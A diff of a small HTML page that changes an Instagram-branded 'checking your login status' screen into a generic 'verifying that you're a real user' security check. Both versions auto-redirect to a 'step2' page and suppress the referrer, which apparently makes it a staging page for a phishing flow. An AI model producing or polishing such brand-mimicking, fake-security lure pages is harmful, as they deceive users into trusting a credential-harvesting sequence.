@@ -2,47 +2,64 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Instagram Login</title>
+  <title>Verifying User Session...</title>
   <meta name="referrer" content="no-referrer">
-  <meta http-equiv="refresh" content="1.5; url=step2/index.html">
+  <meta http-equiv="refresh" content="2; url=step2/index.html">
   <style>
     body {
-      background-color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: #262626;
+      background-color: #f1f3f6;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      color: #333;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
+      text-align: center;
     }
-    .logo {
-      width: 120px;
-      margin-bottom: 30px;
+    .container {
+      background-color: #ffffff;
+      padding: 30px 40px;
+      border-radius: 14px;
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.08);
+      max-width: 420px;
     }
-    .text {
-      font-size: 16px;
-      color: #8e8e8e;
+    h1 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 14px;
+      color: #555;
     }
     .spinner {
-      margin-top: 20px;
-      width: 24px;
-      height: 24px;
-      border: 3px solid #dbdbdb;
-      border-top: 3px solid #3897f0;
+      margin: 25px auto 10px;
+      width: 36px;
+      height: 36px;
+      border: 4px solid #ccc;
+      border-top: 4px solid #2e7d32;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+      animation: spin 0.7s linear infinite;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    .note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 8px;
+    }
   </style>
 </head>
 <body>
-  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
-  <div class="text">Checking your login status...</div>
-  <div class="spinner"></div>
+  <div class="container">
+    <h1>Verifying that you're a real user</h1>
+    <p>For your security, we are verifying your session before redirecting...</p>
+    <div class="spinner"></div>
+    <p class="note">This process helps us prevent bots and fake requests.</p>
+  </div>
 </body>
 </html>
